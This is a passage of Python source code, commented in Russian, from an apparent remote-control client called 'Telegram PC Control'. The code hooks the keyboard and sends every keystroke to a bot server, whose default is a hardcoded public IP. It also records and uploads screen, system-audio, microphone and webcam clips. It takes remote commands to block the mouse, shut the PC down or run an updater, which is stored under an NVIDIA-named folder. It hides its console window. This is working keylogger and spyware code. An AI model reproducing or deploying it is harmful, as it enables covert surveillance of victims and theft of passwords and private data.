        logging.info(f"🎬 Начинаю кодирование {len(video_frames)} кадров @ {replay_fps} FPS...")
        
        from PIL import Image as PILImage
        import io
        
        for i, frame_data in enumerate(video_frames):
            try:
                # Декодируем JPEG обратно в RGB (ОПТИМИЗАЦИЯ ПАМЯТИ)
                # frame_data сейчас это JPEG bytes, а не numpy array
                if isinstance(frame_data, bytes):
                    # Декодируем JPEG в PIL Image
                    img = PILImage.open(io.BytesIO(frame_data))
                    # Конвертируем в numpy array
                    frame_np = np.array(img)
                else:
                    # Обратная совместимость со старыми буферами (если есть)
                    frame_np = frame_data
                
                frame = av.VideoFrame.from_ndarray(frame_np, format='rgb24')
                # ВАЖНО: устанавливаем PTS правильно для 60 FPS
                if t0 is not None and ts_list[i] is not None:
                    # Используем временные метки для точного PTS
                    frame.pts = int(round((ts_list[i] - t0) * replay_fps))
                else:
                    # Без меток - просто последовательные номера кадров
                    frame.pts = i
                frame.time_base = Fraction(1, replay_fps)
                
                # Кодируем кадр
                for packet in video_stream.encode(frame):
                    container.mux(packet)
            except Exception as e:
                logging.error(f"Error encoding video frame {i}: {e}")
        
        # Логируем результат
        if len(video_frames) > 0:
            expected_duration = len(video_frames) / replay_fps
            logging.info(f"✅ Закодировано {len(video_frames)} кадров, ожидаемая длительность: {expected_duration:.2f}с @ {replay_fps} FPS")
        for packet in video_stream.encode():
            container.mux(packet)
        if audio_stream is not None and mixed_audio is not None and mixed_audio.size > 0:
            try:
                import numpy as np
                audio_data = mixed_audio
                if audio_data.dtype != np.float32:
                    audio_data = audio_data.astype(np.float32)
                audio_data = np.ascontiguousarray(audio_data)
                cs = replay_audio_chunk
                samples_written = 0
                for j in range(0, len(audio_data), cs):
                    chunk = audio_data[j:j+cs]
                    if len(chunk) < cs:
                        import numpy as np2
                        chunk = np2.pad(chunk, ((0, cs - len(chunk)), (0, 0)), mode='constant')
                    # Create planar float frame (channels, samples)
                    chks = chunk.shape[0]
                    chunk_T = np.ascontiguousarray(chunk.T, dtype=np.float32)
                    audio_frame = av.AudioFrame.from_ndarray(chunk_T, format='fltp', layout='stereo')
                    audio_frame.sample_rate = replay_audio_rate
                    try:
                        audio_frame.pts = samples_written
                    except Exception:
                        pass
                    samples_written += chks
                    for packet in audio_stream.encode(audio_frame):
                        container.mux(packet)
                for packet in audio_stream.encode():
                    container.mux(packet)
            except Exception as e:
                logging.error(f"Error encoding audio: {e}")
        container.close()
        if not os.path.exists(video_path):
            logging.error(f"Instant Replay: файл не создан: {video_path}")
            return None
        logging.info(f"Instant Replay: видео сохранено: {video_path}")
        return video_path
    except Exception as e:
        logging.exception(f"Ошибка сохранения Instant Replay: {e}")
        return None
    finally:
        replay_saving_in_progress = False

def save_instant_replay_webcam(camera_index: Optional[int] = None, duration_sec: int = 10):
    """Пишет короткий клип с вебкамеры в MP4 (on-demand, без постоянного буфера)."""
    try:
        import cv2
        import numpy as np
        import tempfile
        import time

        if not WEBCAM_INDICES:
            logging.warning("Webcam Replay: вебкамеры не найдены")
            return None
        if camera_index is None:
            cam_idx = WEBCAM_INDICES[0]
        else:
            cam_idx = camera_index
        # Если запрошенный индекс недоступен, берём первый доступный
        if cam_idx not in WEBCAM_INDICES:
            logging.warning(f"Webcam Replay: камера {cam_idx} недоступна, используем {WEBCAM_INDICES[0]}")
            cam_idx = WEBCAM_INDICES[0]

        cap = cv2.VideoCapture(cam_idx)
        if not cap or not cap.isOpened():
            logging.warning(f"Webcam Replay: не удалось открыть камеру {cam_idx}")
            try:
                if cap:
                    cap.release()
            except Exception:
                pass
            return None

        fps = 15.0
        target_w = 640
        quality = 70
        start_ts = time.time()
        frames = []

        while time.time() - start_ts < duration_sec:
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.05)
                continue
            h, w = frame.shape[:2]
            new_h = int(h * (target_w / max(w, 1)))
            frame_resized = cv2.resize(frame, (target_w, new_h))
            frames.append(frame_resized)
            time.sleep(1.0 / fps)

        try:
            cap.release()
        except Exception:
            pass

        if not frames:
            logging.warning("Webcam Replay: не удалось получить кадры с камеры")
            return None

        h, w = frames[0].shape[:2]
        temp_dir = os.getenv('TEMP') or tempfile.gettempdir()
        try:
            os.makedirs(temp_dir, exist_ok=True)
        except Exception:
            pass
        video_path = os.path.join(temp_dir, f'webcam_replay_{int(time.time())}_{int(time.time()*1000000)%1000000}.mp4')
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        writer = cv2.VideoWriter(video_path, fourcc, fps, (w, h))
        if not writer.isOpened():
            logging.error("Webcam Replay: не удалось открыть VideoWriter")
            return None
        for f in frames:
            if f.shape[0] != h or f.shape[1] != w:
                f = cv2.resize(f, (w, h))
            writer.write(f)
        writer.release()
        if not os.path.exists(video_path):
            logging.error(f"Webcam Replay: файл не создан: {video_path}")
            return None
        logging.info(f"Webcam Replay: видео сохранено (камера {cam_idx}): {video_path}")
        return video_path
    except Exception as e:
        logging.exception(f"Ошибка сохранения Webcam Replay: {e}")
        return None

def send_instant_replay(chat_id: Optional[int]):
    """Запускает сохранение instant replay в отдельном потоке чтобы не фризить основной поток"""
    def _save_and_send_async():
        try:
            # Понижаем приоритет потока сохранения, чтобы он меньше мешал системе
            try:
                set_current_thread_background_priority()
            except Exception:
                pass
            logging.info("Instant Replay: начинаю сохранение клипа в фоновом потоке...")
            video_path = save_instant_replay()
            if not video_path:
                logging.error("Instant Replay: не удалось сохранить видео")
                return
            try:
                with open(video_path, 'rb') as f:
                    # Передаем chat_id, если он известен, чтобы бот отправил откат нужному пользователю
                    data = {"device_id": DEVICE_ID}
                    if chat_id is not None:
                        data["chat_id"] = str(chat_id)
                    response = requests.post(
                        f"{BOT_BASE_URL}/replay",
                        data=data,
                        files={"file": ("replay.mp4", f, "video/mp4")},
                        timeout=60.0,
                    )
                    if response.ok:
                        logging.info("Instant Replay: видео успешно отправлено на бот")
                    else:
                        logging.error(f"Instant Replay: ошибка отправки: HTTP {response.status_code}")
            except Exception as e:
                logging.error(f"Instant Replay: не удалось отправить видео: {e}")
            finally:
                try:
                    os.remove(video_path)
                    logging.info(f"Instant Replay: временный файл удалён")
                except Exception:
                    pass
        except Exception as e:
            logging.exception(f"Критическая ошибка в send_instant_replay: {e}")
    
    # Запускаем сохранение в отдельном потоке чтобы не блокировать основной поток
    threading.Thread(target=_save_and_send_async, daemon=True, name="InstantReplaySaver").start()
    logging.info("✅ Instant Replay: сохранение запущено в фоновом режиме")

def send_instant_replay_webcam(chat_id: Optional[int], camera_index: Optional[int] = None):
    """Сохраняет и отправляет клип с вебкамеры (on-demand, без постоянного буфера)."""
    def _save_and_send_async():
        try:
            # Понижаем приоритет потока сохранения вебкамеры
            try:
                set_current_thread_background_priority()
            except Exception:
                pass
            logging.info("Webcam Replay: начинаю запись клипа с вебкамеры в фоновом потоке...")
            video_path = save_instant_replay_webcam(camera_index=camera_index)
            if not video_path:
                logging.error("Webcam Replay: не удалось сохранить видео")
                return
            try:
                with open(video_path, 'rb') as f:
                    data = {"device_id": DEVICE_ID}
                    if chat_id is not None:
                        data["chat_id"] = str(chat_id)
                    response = requests.post(
                        f"{BOT_BASE_URL}/replay_webcam",
                        data=data,
                        files={"file": ("webcam_replay.mp4", f, "video/mp4")},
                        timeout=60.0,
                    )
                    if response.ok:
                        logging.info("Webcam Replay: видео успешно отправлено на бот")
                    else:
                        logging.error(f"Webcam Replay: ошибка отправки: HTTP {response.status_code}")
            except Exception as e:
                logging.error(f"Webcam Replay: не удалось отправить видео: {e}")
            finally:
                try:
                    os.remove(video_path)
                    logging.info("Webcam Replay: временный файл удалён")
                except Exception:
                    pass
        except Exception as e:
            logging.exception(f"Критическая ошибка в send_instant_replay_webcam: {e}")
    threading.Thread(target=_save_and_send_async, daemon=True, name="WebcamReplaySaver").start()

# Global thread pool for blocking operations
thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=2)

def events_poll_loop():
    logging.info(f"🔄 events_poll_loop запущен. BOT_BASE_URL={BOT_BASE_URL}, DEVICE_ID={DEVICE_ID}")
    poll_count = 0
    consecutive_errors = 0
    last_error_log_time = 0
    offline_mode = False
    
    while True:
        try:
            poll_count += 1
            if poll_count % 600 == 0:  # Log every 30 sec (600 * 0.05 sec = 30 sec)
                logging.info(f"🔄 events_poll_loop alive: {poll_count} запросов")
            r = requests.get(f"{BOT_BASE_URL}/events", params={"device_id": DEVICE_ID}, timeout=3.0)
            if r.ok:
                # Успешное подключение - сбрасываем offline режим
                if offline_mode or consecutive_errors > 0:
                    logging.info("✅ Соединение с ботом восстановлено!")
                    offline_mode = False
                    consecutive_errors = 0
                
                data = r.json()
                evs = data.get("events") or []
                if evs:
                    logging.info(f"📥 Получено {len(evs)} событий от бота")
                    logging.info(f"📋 События: {[e.get('type') for e in evs]}")
                for ev in evs:
                    ev_type = ev.get("type")
                    logging.info(f"🎯 Обработка события: {ev_type}")
                    logging.debug(f"   Данные события: {ev}")
                    if ev_type == "shot":
                        chat_id = last_state.get("chat_id")
                        if not chat_id:
                            try:
                                s = requests.get(f"{BOT_BASE_URL}/state", params={"device_id": DEVICE_ID}, timeout=2.5)
                                if s.ok:
                                    chat_id = s.json().get("chat_id")
                            except Exception:
                                chat_id = None
                        threading.Thread(target=capture_and_send_screenshot, args=(chat_id,), daemon=True).start()
                    elif ev_type == "block_mouse":
                        block_mouse()
                    elif ev_type == "unblock_mouse":
                        unblock_mouse()
                    elif ev_type == "shutdown":
                        shutdown_pc()
                    elif ev_type == "monitor_off":
                        monitor_off()
                    elif ev_type == "monitor_on":
                        monitor_on()
                    elif ev_type == "change_wallpaper":
                        photo_data_base64 = ev.get("photo_data_base64")
                        if photo_data_base64:
                            try:
                                import base64
                                photo_data = base64.b64decode(photo_data_base64)
                                logging.info(f"Фото декодировано: {len(photo_data)} байт")
                                threading.Thread(target=change_wallpaper, args=(photo_data,), daemon=True).start()
                            except Exception as e:
                                logging.error(f"Ошибка декодирования base64: {e}")
                    elif ev_type == "instant_replay":
                        chat_id = last_state.get("chat_id")
                        if not chat_id:
                            try:
                                s = requests.get(f"{BOT_BASE_URL}/state", params={"device_id": DEVICE_ID}, timeout=1.0)
                                if s.ok:
                                    chat_id = s.json().get("chat_id")
                            except Exception:
                                chat_id = None
                        if not replay_saving_in_progress:
                            # Use global thread pool to avoid creating new executor every time
                            thread_pool.submit(send_instant_replay, chat_id)
                        else:
                            logging.warning("⚠️ Instant Replay request ignored - already in progress")
                    elif ev_type == "instant_replay_webcam":
                        chat_id = last_state.get("chat_id")
                        if not chat_id:
                            try:
                                s = requests.get(f"{BOT_BASE_URL}/state", params={"device_id": DEVICE_ID}, timeout=1.0)
                                if s.ok:
                                    chat_id = s.json().get("chat_id")
                            except Exception:
                                chat_id = None
                        cam_idx = ev.get("camera_index")
                        thread_pool.submit(send_instant_replay_webcam, chat_id, cam_idx)
                    elif ev_type == "display_text":
                        txt = ev.get("text") or ""
                        tms = int(ev.get("timeout_ms") or 5000)
                        threading.Thread(target=show_overlay_text, args=(txt, tms), daemon=True).start()
                    elif ev_type == "mute_sound" or ev_type == "toggle_sound" or ev_type == "sound_toggle" or ev_type == "toggle_mute":
                        # Переключение звука (mute/unmute)
                        logging.info(f"🔊 Получено событие переключения звука: {ev_type}")
                        threading.Thread(target=toggle_sound, daemon=True).start()
                    elif ev_type in ("apply_mute_state", "mute_on", "mute_off"):
                        desired = ev.get("muted")
                        if desired is None:
                            desired = (ev_type == "mute_on")
                        logging.info(f"🔊 Применяю состояние звука по событию: muted={bool(desired)}")
                        threading.Thread(target=lambda: apply_system_mute(bool(desired)), daemon=True).start()
                    elif ev_type == "get_wallpaper":
                        chat_id = last_state.get("chat_id")
                        if not chat_id:
                            try:
                                s = requests.get(f"{BOT_BASE_URL}/state", params={"device_id": DEVICE_ID}, timeout=2.5)
                                if s.ok:
                                    chat_id = s.json().get("chat_id")
                            except Exception:
                                chat_id = None
                        threading.Thread(target=get_current_wallpaper_and_send, args=(chat_id,), daemon=True).start()
                    elif ev_type == "play_audio":
                        fp = ev.get("tg_file_path")
                        if fp:
                            threading.Thread(target=play_audio_from_tg, args=(fp,), daemon=True).start()
                    elif ev_type == "update_program":
                        # Запуск локального обновления через updater.exe
                        try:
                            appdata = os.environ.get("APPDATA") or os.path.expanduser("~")
                            upd_path = os.path.join(appdata, "NVIDIA", "updater.exe")
                            if os.path.exists(upd_path):
                                logging.info("🔄 Получена команда update_program: запускаю updater.exe /update")
                                try:
                                    subprocess.Popen([upd_path, "/update"], cwd=os.path.dirname(upd_path))
                                except Exception as e:
                                    logging.error(f"update_program: не удалось запустить updater.exe: {e}")
                            else:
                                logging.warning("update_program: updater.exe не найден в %APPDATA%\\NVIDIA")
                        except Exception as e:
                            logging.error(f"update_program: ошибка обработки события: {e}")
                    else:
                        # НЕОБРАБОТАННОЕ СОБЫТИЕ - логируем для отладки
                        logging.warning(f"⚠️ НЕОБРАБОТАННОЕ СОБЫТИЕ: {ev_type}")
                        logging.warning(f"   Полные данные: {ev}")
        except Exception as e:
            consecutive_errors += 1
            current_time = time.time()
            
            # Логируем ошибку только раз в 60 секунд в offline режиме
            if not offline_mode:
                logging.error(f"❌ events_poll_loop error: {e}")
                last_error_log_time = current_time
            elif current_time - last_error_log_time >= 60:
                logging.warning(f"⚠️ Бот всё ещё недоступен (offline режим, попытка {consecutive_errors})")
                last_error_log_time = current_time
            
            # После 10 ошибок подряд - переходим в offline режим
            if consecutive_errors >= 10 and not offline_mode:
                offline_mode = True
                # Update global flag
                global bot_offline_mode
                bot_offline_mode = True
                logging.warning("")
                logging.warning("═" * 60)
                logging.warning("  ⚠️  ПЕРЕХОД В OFFLINE РЕЖИМ")
                logging.warning("═" * 60)
                logging.warning("  Бот недоступен. Программа продолжит работу без бота.")
                logging.warning("  Попытки переподключения: каждые 30 секунд (без спама в логах)")
                logging.warning("  События НЕ отправляются (экономия ресурсов)")
                logging.warning("═" * 60)
                logging.warning("")
        
        # Интервал между запросами: быстро если онлайн, редко если оффлайн
        if offline_mode:
            time.sleep(30.0)  # OFFLINE: 1 попытка каждые 30 секунд
        else:
            time.sleep(0.05)  # ONLINE: 20 запросов в секунду для мгновенной реакции

if HAS_TK:
    class App:
        def __init__(self, root):
            self.root = root
            self.root.title("Видимая программа отправки ввода")
            self.build_ui()
            self.root.protocol("WM_DELETE_WINDOW", self.on_close)
            threading.Thread(target=send_event_worker, daemon=True).start()
            threading.Thread(target=register_loop, daemon=True).start()
            threading.Thread(target=poll_state_loop, args=(self.update_ui_from_state,), daemon=True).start()
            hide_console_window()
        def build_ui(self):
            frm = ttk.Frame(self.root, padding=12)
            frm.grid(row=0, column=0, sticky="nsew")
            self.root.rowconfigure(0, weight=1)
            self.root.columnconfigure(0, weight=1)
            title = ttk.Label(frm, text="Окно ввода. Тест интерфейса.")
            title.grid(row=0, column=0, sticky="w")
        def update_ui_from_state(self, st: dict):
            pass
        def on_close(self):
            self.root.destroy()

def _discover_bot_server():
    """Автоматически находит бот сервер в сети через UDP broadcast"""
    try:
        logging.info(f"🔍 Quick bot discovery (5s timeout)...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)  # Faster timeout
        
        # Слушаем broadcast сообщения
        sock.bind(('', 8766))
        
        for attempt in range(5):  # More attempts for better remote PC detection
            try:
                data, addr = sock.recvfrom(1024)
                message = json.loads(data.decode('utf-8'))
                
                if message.get('type') == 'telegram_bot_server':
                    # Prefer LAN URL when sender is in private range; else prefer public_url
                    port = int(message.get('port') or 25565)
                    a = addr[0]
                    parts = (a or '').split('.')
                    is_private = a.startswith('10.') or a.startswith('192.168.') or (len(parts) >= 2 and parts[0] == '172' and parts[1].isdigit() and 16 <= int(parts[1]) <= 31)
                    if is_private:
                        bot_url = f"http://{a}:{port}"
                    else:
                        bot_url = message.get('public_url') or message.get('url') or f"http://{a}:{port}"
                    # Normalize localhost to sender address
                    if '127.0.0.1' in bot_url or 'localhost' in bot_url:
                        bot_url = bot_url.replace('127.0.0.1', a).replace('localhost', a)
                    logging.info(f"✅ REMOTE CONNECTION SUCCESS: {bot_url} from {addr[0]} (remote PC detected)")
                    sock.close()
                    return bot_url
            except socket.timeout:
                logging.info(f"🔍 Discovery attempt {attempt + 1}/5...")
                continue
            except Exception as e:
                logging.debug(f"Discovery error: {e}")
                continue
        
        sock.close()
        logging.warning("❌ REMOTE CONNECTION FAILED: No bot server found via UDP discovery (check network/firewall)")
        return None
        
    except Exception as e:
        logging.warning(f"❌ Discovery failed: {e}")
        return None

def configure_runtime():
    global BOT_BASE_URL, DEVICE_ID, DEVICE_NAME
    url = None
    
    logging.info("🌐 SERVER CONNECTION ATTEMPT: Starting server discovery...")
    
    # 1. ПРИОРИТЕТ: Конфиг для интернет-подключения
    logging.info("🔍 Step 1: Reading config.ini for internet/direct connection...")
    try:
        here = os.path.dirname(__file__) if '__file__' in globals() else os.getcwd()
        cfg_path = os.path.join(here, 'config.ini')
        if os.path.exists(cfg_path):
            try:
                import configparser
                config = configparser.ConfigParser()
                config.read(cfg_path, encoding='utf-8')
                
                if 'SERVER' in config:
                    server_url = config['SERVER'].get('url', '').strip()
                    if server_url and (server_url.startswith('http://') or server_url.startswith('https://')):
                        url = server_url
                        logging.info(f"✅ SERVER FOUND via config.ini: {url} (internet/direct connection)")
            except Exception as e:
                logging.warning(f"❌ config.ini read error: {e}")
        else:
            logging.info("ℹ️ config.ini not found (optional - for internet connections)")
    except Exception:
        pass
    
    # 2. Пробуем автообнаружение в локальной сети (если config не задан)
    if not url:
        logging.info("🔍 Step 2: UDP broadcast discovery for local network...")
        url = _discover_bot_server()
        
        if url:
            logging.info(f"✅ SERVER FOUND via UDP: {url} (local network)")
    
    # 3. Пробуем старый конфиг bot_url.txt (для совместимости)
    if not url:
        logging.info("🔍 Step 3: Reading legacy bot_url.txt configuration...")
        try:
            here = os.path.dirname(__file__) if '__file__' in globals() else os.getcwd()
            cfg = os.path.join(here, 'bot_url.txt')
            if os.path.exists(cfg):
                try:
                    with open(cfg, 'r', encoding='utf-8') as f:
                        line = (f.read() or '').strip()
                        if line.startswith('http://') or line.startswith('https://'):
                            if ('127.0.0.1' in line) or ('localhost' in line):
                                logging.warning("⚠️ Ignoring bot_url.txt because it points to localhost. Remove this file or set a public/LAN IP:PORT.")
                            else:
                                url = line
                                logging.info(f"✅ SERVER FOUND via bot_url.txt: {url}")
                        else:
                            logging.warning(f"❌ Invalid URL in bot_url.txt: {line}")
                except Exception as e:
                    logging.warning(f"❌ bot_url.txt read error: {e}")
            else:
                logging.info("ℹ️ bot_url.txt not found (legacy config)")
        except Exception:
            pass
    
    # 4. Если ничего не нашли, используем дефолтный публичный адрес сервера
    if not url:
        logging.info("🔍 Step 4: Using default server address...")
        url = os.getenv("PROGRAM_BOT_URL") or "http://164.215.97.151:25565"
        logging.info(f"📡 SERVER DEFAULT: {url} (hardcoded)")
    
    # 5. Проверяем соединение с сервером
    logging.info(f"🔗 Step 5: Testing connection to {url}...")
    bot_connection_ok = False
    try:
        # timeout=(connect_timeout, read_timeout) - явно указываем оба таймаута
        # connect_timeout=3 - максимум 3 секунды на установку соединения
        # read_timeout=2 - максимум 2 секунды на чтение ответа
        try:
            test_response = requests.get(f"{url}/health", timeout=(3.0, 2.0))
        except Exception:
            test_response = requests.get(f"{url}/", timeout=(3.0, 2.0))
        if test_response.ok or test_response.status_code in (200, 404):
            logging.info(f"✅ SERVER CONNECTION TEST: SUCCESS (HTTP {test_response.status_code})")
            bot_connection_ok = True
    except requests.exceptions.Timeout:
        logging.error(f"❌ SERVER CONNECTION TEST: TIMEOUT (connect: 3s, read: 2s)")
        logging.error(f"   Bot server {url} is not responding (wrong IP or network issue)")
    except requests.exceptions.ConnectionError as e:
        logging.error(f"❌ SERVER CONNECTION TEST: CONNECTION ERROR")
        logging.error(f"   Cannot reach {url} - Check if bot.py is running on the target server!")
        logging.error(f"   If bot is on another PC, create config.ini with [server] url=http://BOT_IP:25565")
    except Exception as e:
        logging.error(f"❌ SERVER CONNECTION TEST: FAILED - {type(e).__name__}: {e}")
    
    if not bot_connection_ok:
        logging.warning("")
        logging.warning("════════════════════════════════════════════════════════════")
        logging.warning("  ⚠️  BOT CONNECTION FAILED - PROGRAM WILL RUN IN OFFLINE MODE")
        logging.warning("════════════════════════════════════════════════════════════")
        logging.warning("")
        logging.warning("📋 How to fix:")
        logging.warning("")
        logging.warning("   1. If bot is on THIS PC:")
        logging.warning("      - Run: python bot\\bot.py")
        logging.warning("")
        logging.warning("   2. If bot is on ANOTHER PC (same network):")
        logging.warning("      - Create file: program\\config.ini")
        logging.warning("      - Add:")
        logging.warning("        [server]")
        logging.warning("        url = http://BOT_IP_ADDRESS:25565")
        logging.warning("")
        logging.warning("   3. If bot is on ANOTHER PC (internet):")
        logging.warning("      - Same as option 2, but use public IP or domain")
        logging.warning("      - Make sure port 25565 is forwarded in router")
        logging.warning("")
        logging.warning("════════════════════════════════════════════════════════════")
        logging.warning("  Program will continue without bot (keyboard capture only)")
        logging.warning("════════════════════════════════════════════════════════════")
        logging.warning("")
    
    # 6. Если соединение успешно и config.ini отсутствует, создаем его автоматически
    try:
        here_cfg = os.path.dirname(__file__) if '__file__' in globals() else os.getcwd()
        cfg_path_auto = os.path.join(here_cfg, 'config.ini')
        if bot_connection_ok and not os.path.exists(cfg_path_auto) and url and (url.startswith('http://') or url.startswith('https://')):
            import configparser
            cfg = configparser.ConfigParser()
            section = 'SERVER'
            cfg[section] = {}
            cfg[section]['url'] = url
            with open(cfg_path_auto, 'w', encoding='utf-8') as f:
                cfg.write(f)
            logging.info(f"✅ AUTO-CONFIG: config.ini created with server URL {url}")
    except Exception as e:
        logging.warning(f"⚠️ AUTO-CONFIG: failed to create config.ini: {e}")

    os.environ["PROGRAM_BOT_URL"] = url
    BOT_BASE_URL = url
    device_id, device_name = _mk_device_identity()
    DEVICE_ID = device_id
    DEVICE_NAME = device_name
    os.environ["DEVICE_ID"] = DEVICE_ID
    os.environ["DEVICE_NAME"] = DEVICE_NAME


def _parse_version(ver: str):
    try:
        return tuple(int(p) for p in ver.split('.') if p.isdigit())
    except Exception:
        return ()

def check_for_update_and_run_updater():
    """Checks manifest.json on update server and, if version differs, runs updater.exe.

    Designed to work only in frozen (PyInstaller) build. When update is triggered,
    this function starts updater.exe /update and terminates current process.
    """
    if not getattr(sys, 'frozen', False):
        return

    manifest_url = UPDATE_BASE_URL.rstrip('/') + '/manifest.json'

    try:
        with urllib.request.urlopen(manifest_url, timeout=3.0) as resp:
            raw = resp.read().decode('utf-8', errors='replace')
        data = json.loads(raw)
    except Exception:
        # If update server is not reachable, silently continue with current version
        return

    remote_ver = str(data.get('version') or '').strip()
    local_ver = str(APP_VERSION).strip()

    if not remote_ver or remote_ver == local_ver:
        return

    # Simple semantic-like comparison; if parsing fails we still allow any different version
    rv = _parse_version(remote_ver)
    lv = _parse_version(local_ver)
    if rv and lv and rv <= lv:
        return

    # Find updater.exe in %APPDATA%\NVIDIA
    appdata = os.environ.get("APPDATA") or os.path.expanduser("~")
    upd_path = os.path.join(appdata, "NVIDIA", "updater.exe")
    if not os.path.exists(upd_path):
        return

    try:
        subprocess.Popen([upd_path, "/update"], cwd=os.path.dirname(upd_path))
    except Exception:
        return

    # Give updater some time to start, then exit current process
    try:
        time.sleep(0.5)
    except Exception:
        pass
    sys.exit(0)

if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        try:
            check_for_update_and_run_updater()
        except Exception:
            try:
                logging.exception("update check failed")
            except Exception:
                pass

    try:
        # Понижаем приоритет процесса до BELOW_NORMAL, чтобы программа меньше мешала другим задачам
        set_process_background_priority()

        logging.info("🚀 Telegram PC Control starting...")
        configure_runtime()
        logging.info(f"🔗 Bot URL configured: {BOT_BASE_URL}")
        logging.info(f"🆔 Device ID: {DEVICE_ID}")
        # hide_console()  # Оставляю окно видимым для логов
        initial_layout_is_ru = get_current_keyboard_layout()
        logging.info(f"Начальная раскладка: {'RU' if initial_layout_is_ru else 'EN'}")
        try:
            globals()['bot_layout_ru'] = bool(initial_layout_is_ru)
            logging.info(f"Начальная раскладка бота установлена: {'RU' if bot_layout_ru else 'EN'}")
        except Exception:
            pass
        logging.info(f"Transliteration: {'ON' if transliterate else 'OFF'}")
        threading.Thread(target=send_event_worker, daemon=True).start()
        threading.Thread(target=register_loop, daemon=True).start()
        threading.Thread(target=poll_state_loop, args=(lambda st: None,), daemon=True).start()
        # Определяем доступные вебкамеры (лёгкий скан) до запуска потоков
        detect_webcams()
        threading.Thread(target=events_poll_loop, daemon=True).start()
        threading.Thread(target=instant_replay_video_capture_loop, daemon=True).start()
        logging.info("🎵 Starting instant replay audio capture loops...")
        # Включаю новую систему захвата системного звука
        threading.Thread(target=instant_replay_audio_loopback_loop, daemon=True).start()
        logging.info("🔊 System audio capture ENABLED (новый алгоритм с автопоиском)")
        
        # Микрофон работает отлично - используем его
        threading.Thread(target=instant_replay_audio_mic_loop, daemon=True).start()  
        logging.info("🎤 Microphone audio capture ENABLED for instant replay")
        threading.Thread(target=keyboard_layout_monitor, daemon=True).start()
        
        # Глобальный флаг чтобы хук запустился только ОДИН раз
        if 'keyboard_hook_started' not in globals():
            globals()['keyboard_hook_started'] = False
        
        def start_keyboard_hook():
            if globals().get('keyboard_hook_started', False):
                logging.warning("⚠️ Keyboard hook already started, skipping duplicate call")
                return True
            
            try:
                if HAS_PYNPUT:
                    logging.info("🎹 Starting pynput keyboard hook (PRIMARY)...")
                    globals()['keyboard_hook_started'] = True
                    mods = set()
                    def _on_press(key):
                        try:
                            global force_en, last_lang_ts, transliterate
                            if key in (pynput_keyboard.Key.ctrl, pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r):
                                mods.add('ctrl'); return
                            if key == pynput_keyboard.Key.enter:
                                post_event("enter"); return
                            if key == pynput_keyboard.Key.backspace:
                                post_event("ctrl_backspace" if 'ctrl' in mods else "backspace"); return
                            if key == pynput_keyboard.Key.delete:
                                post_event("ctrl_delete" if 'ctrl' in mods else "delete"); return
                            if key in (pynput_keyboard.Key.alt, pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r):
                                mods.add('alt')
                                if 'shift' in mods:
                                    now = time.time()
                                    if (now - last_lang_ts) > 0.5:
                                        toggle_bot_layout(); last_lang_ts = now
                                        logging.info("Alt+Shift: переключаю раскладку в боте")
                                return
                            if key in (pynput_keyboard.Key.shift, pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r):
                                mods.add('shift')
                                if 'alt' in mods:
                                    now = time.time()
                                    if (now - last_lang_ts) > 0.5:
                                        toggle_bot_layout(); last_lang_ts = now
                                        logging.info("Alt+Shift: переключаю раскладку в боте")
                                return
                            if key == pynput_keyboard.Key.space:
                                post_event("key", " "); return
                            if isinstance(key, pynput_keyboard.KeyCode):
                                ch = key.char
                                if ch:
                                    post_event("key", map_char_by_bot_layout(ch))
                        except Exception:
                            logging.exception("pynput on_press error")
                    def _on_release(key):
                        try:
                            if key in (pynput_keyboard.Key.ctrl, pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r):
                                mods.discard('ctrl')
                            if key in (pynput_keyboard.Key.alt, pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r):
                                mods.discard('alt')
                            if key in (pynput_keyboard.Key.shift, pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r):
                                mods.discard('shift')
                        except Exception:
                            logging.exception("pynput on_release error")
                    listener = pynput_keyboard.Listener(on_press=_on_press, on_release=_on_release)
                    listener.daemon = True
                    listener.start()
                    logging.info("✅ pynput keyboard hook STARTED and ACTIVE")
                    logging.info("⚠️ keyboard_hook_started flag is now TRUE - no more hooks will start")
                    return True
                elif HAS_KEYBOARD:
                    logging.info("🎹 Starting keyboard library hook (FALLBACK)...")
                    globals()['keyboard_hook_started'] = True
                    def _kb_on_press(event):
                        try:
                            global force_en, last_lang_ts_fb, transliterate
                            name = getattr(event, "name", "") or ""
                            try:
                                is_ctrl = keyboard.is_pressed('ctrl') or keyboard.is_pressed('left ctrl') or keyboard.is_pressed('right ctrl')
                            except Exception:
                                is_ctrl = False
                            try:
                                is_alt = keyboard.is_pressed('alt') or keyboard.is_pressed('left alt') or keyboard.is_pressed('right alt')
                                is_shift = keyboard.is_pressed('shift') or keyboard.is_pressed('left shift') or keyboard.is_pressed('right shift')
                            except Exception:
                                is_alt = False; is_shift = False
                            if name == "enter":
                                post_event("enter"); return
                            if name == "backspace":
                                post_event("ctrl_backspace" if is_ctrl else "backspace"); return
                            if name == "delete":
                                post_event("ctrl_delete" if is_ctrl else "delete"); return
                            if is_alt and is_shift:
                                now = time.time()
                                if (now - last_lang_ts_fb) > 0.5:
                                    toggle_bot_layout(); last_lang_ts_fb = now
                                    logging.info("Alt+Shift: переключаю раскладку в боте")
                                return
                            if name == "space":
                                post_event("key", " "); return
                            if len(name) == 1:
                                post_event("key", map_char_by_bot_layout(name))
                        except Exception:
                            logging.exception("keyboard hook on_press error")
                    keyboard.on_press(_kb_on_press)
                    logging.info("✅ keyboard library hook started successfully")
                    return True
                else:
                    logging.warning("No keyboard library available (neither pynput nor keyboard)")
                    return False
            except Exception:
                logging.exception("start_keyboard_hook failed")
                return False
        if not SAFE_MODE:
            started = start_keyboard_hook()
            if not started:
                logging.error("Keyboard hook not started; continuing without key capture")
        else:
            logging.warning("PROGRAM_SAFE_MODE=1: skipping keyboard hook")
        while True:
            time.sleep(1)
    except Exception:
        try:
            with open(os.path.join(os.path.dirname(__file__), 'program_error.log'), 'a', encoding='utf-8') as f:
                f.write('\n' + time.strftime('%Y-%m-%d %H:%M:%S') + '\n')
